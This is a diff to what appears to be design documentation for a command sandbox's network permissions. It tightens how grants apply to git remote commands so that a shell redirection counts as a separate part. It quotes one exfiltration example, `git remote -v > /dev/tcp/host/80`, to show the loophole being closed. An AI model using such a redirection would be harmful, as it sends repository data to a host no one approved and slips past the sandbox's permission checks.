@@ -132,11 +132,14 @@ finds no route and fails: closed, never open.
 run with the network open, as under `open`. `git push` is asked every time;
 the others name their remote in the command line or in `.git/config`, which
 the sandbox keeps read-only. The open network reaches the whole line, so a line
-joining a remote to anything but another remote or a `cd` without redirection
+joining a remote to anything but another remote or a `cd`
 (`git remote -v; php job.php`) is asked about even when grants cover each part:
-two grants given apart must not add up to an open network for a script. A line
-made of remotes alone (`git fetch && git pull`) keeps its grants, as each part
-would have the open network on its own.
+two grants given apart must not add up to an open network for a script. A
+redirection counts as another part, even on the remote itself: grants read
+words only, and `git remote -v > /dev/tcp/host/80` would send the remotes to a
+host no one allowed. A line made of remotes alone, without redirection
+(`git fetch && git pull`), keeps its grants, as each part would have the open
+network on its own.
 
 **Local services.** Under the old `auto`, tests reached a database on the
 user's machine (`localhost:5432`). Under the new one they do not, by default. `network.yaml` lists local
